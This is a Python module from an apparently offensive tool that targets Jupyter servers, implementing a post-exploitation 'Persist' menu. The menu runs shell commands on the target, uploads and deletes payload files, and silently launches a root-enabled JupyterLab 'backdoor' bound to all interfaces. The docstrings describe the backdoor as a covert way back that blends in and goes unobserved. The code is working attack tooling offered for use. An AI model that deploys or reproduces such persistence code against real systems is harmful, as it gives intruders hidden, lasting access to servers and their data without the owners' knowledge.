import asyncio
import inquirer
import time
from vger.attack import Attack
from vger.connection import Connection
from vger.enumerate import Enumerate
from vger.exploit import Exploit


class Persist:
    def __init__(self, host_or_connection, secret=""):
        if isinstance(host_or_connection, Connection):
            self.connection = host_or_connection
        else:
            self.connection = Connection(host_or_connection, secret)

    def persist(self):
        if self.connection.first_time_in_menu["persist"]:
            self.connection.first_time_in_menu["persist"] = False
            self.connection.print_with_rule(
                """
                Develop alternate access mechanisms.
                [bold red]Run shell commands[/bold red] to change server state.
                [bold red]Upload[/bold red] and [bold red]Delete[/bold red] files to manage payloads.
                Launch a [bold red]Backdoor[/bold red] Jupyter server so you have a way back that blends in.
                """,
                category="Persist",
            )
        persist_menu = [
            inquirer.List(
                "option",
                "How would you like to establish persistence?",
                choices=[
                    "Run shell command",
                    "Backdoor",
                    "List dir or get file",
                    "Upload file",
                    "Delete file",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(persist_menu)
        match answer["option"]:
            case "Run shell command":
                Enumerate(self.connection).run_in_shell()
                self.persist()
            case "Backdoor":
                self.jupyter_backdoor()
                self.persist()
            case "List dir or get file":
                Enumerate(self.connection).list_dir()
                self.persist()
            case "Upload file":
                Exploit(self.connection).upload()
                self.persist()
            case "Delete file":
                Exploit(self.connection).delete()
                self.persist()
            case "Back to main menu":
                self.connection.menu.menu()

    def jupyter_backdoor(self, interactive=True, port=7777, secret=""):
        """
        Launches a new JupyterLab instance. This can be useful for browser-based interaction that you don't want observed.
        """
        loop = asyncio.get_event_loop()
        if interactive:
            if len(secret) == 0:
                config = [
                    inquirer.Text(
                        "port",
                        message="What port do you want your Jupyter Server to run on?",
                    ),
                    inquirer.Text(
                        "secret",
                        message="What password do you want to use for authentication?",
                    ),
                ]
                config = inquirer.prompt(config)
                port = config["port"]
                secret = config["secret"]
        if self.connection.target:
            loop.run_until_complete(
                Attack(self.connection).attack_session(
                    self.connection.target,
                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
                    silent=True,
                    print_out=False,
                )
            )
            self.connection.print_with_rule(f"Backdoor attempted on {port}")
        else:
            self.connection.print_with_rule("Target needed for backdoor")
            if interactive and Enumerate(self.connection).pick_target():
                self.jupyter_backdoor(port=port, secret=secret)
            else:
                self.connection.print_with_rule(
                    "Attempting to spawn Jupyter from shell.\nMay fail due to missing dependencies.\nVerify success manually."
                )
                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                loop.run_until_complete(
                    Attack(self.connection).run_ephemeral_terminal(
                        launch_jupyter, stdout=False
                    )
                )
                self.connection.print_with_rule(f"Backdoor attempted on {port}")

    def export_console(self):
        """
        Save anything that's been printed to the console.
        """
        answer = [
            inquirer.Path(
                "path",
                message="What directory would you like to save your output?",
                path_type=inquirer.Path.DIRECTORY,
                exists=True,
            )
        ]
        answer = inquirer.prompt(answer)
        log_path = f"{answer['path']}vger-{time.strftime('%Y%m%d-%H%M%S')}.log"
        try:
            self.connection.con.save_text(log_path)
        except PermissionError:
            self.connection.print_with_rule("Permission denied. Try a different path.")
            self.export_console()
        self.connection.print_with_rule(f"Log saved to {log_path}")
